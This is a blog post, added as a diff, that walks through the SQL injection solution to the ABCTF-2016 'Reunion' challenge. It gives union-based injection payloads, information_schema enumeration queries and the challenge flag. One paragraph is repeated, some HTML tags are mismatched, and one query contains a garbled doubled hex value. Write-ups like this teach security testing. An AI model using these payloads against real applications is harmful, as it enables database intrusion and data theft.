@@ -1,0 +1,60 @@
+---
+layout:     post
+title:      "ABCTF-2016 - Reunion Solution"
+subtitle:   "SQLi Challenge"
+date:       2016-07-26 12:00:00
+author:     "Snoopy, the Security Dog"
+header-img: "img/abcd/0003.png"
+---
+
+<h2>ABCTF-2016 - Reunion Solution</h2>
+
+<p>This challenge involved retrieving and flag using SQL injection.
+
+By looking at the page, it is obvious that the application is vulnerable to SQL injection. This can be confirmed by inputting </b> 2 OR 1=1--</b> in the id parameter.
+<br>
+<img alt="" src="http://snoopythesecuritydog.github.io/img/abcd/0001.png"/>
+
+
+More enumeration can be conducted using the UNION statement:
+
+<blockquote>1 UNION SELECT 1,1,1,1</blockquote>
+
+This was used to find out the numbers of columns. Furthermore, the union statement can be used to find other information regarding the datbase using the following variables:
+
+<ul>
+  <li> Version : SELECT VERSION()</li>
+  <li> User details: user()</li>
+<li> Database details : SELECT db_name(); SELECT database();</li>
+<li> Server details : SELECT @@hostname;</li>
+ </ul>
+
+Using these information, we can find out the current table used by the database.
+
+<blockquote>2 UNION SELECT table_name,1,1,1 from information_schema.tables where table_schema = database()</blockquote>
+
+<img alt="" src="http://snoopythesecuritydog.github.io/img/abcd/0002.png"/>
+
+Using these information, we can find out the current table used by the database.
+
+<blockquote>2 UNION SELECT table_name,1,1,1 from information_schema.tables where table_schema = database()</blockquote>
+
+Using this query, you can get the tablename which is <br>w0w_y0u_f0und_m3</b>. This query can then be used to get the column name.
+
+<br>
+<blockquote>
+union select column_name,1,1,1 from information_schema.columns where table_name = 0x7730775f7930755f6630756e645f6d33.0x7730775f7930755f6630756e645f6d33 
+</blockquote>
+
+The table name is the hex encoded value of the table name which was found perviously. This is necessary since this is integer based SQL Injection.
+
+Using this, you can query and get the flag
+
+</blockquote>abctf{uni0n_1s_4_gr34t_c0mm4nd}</blockquote>
+
+<br>
+
+
+<img alt="" src="http://snoopythesecuritydog.github.io/img/abcd/0004.png"/>
+
+</p>
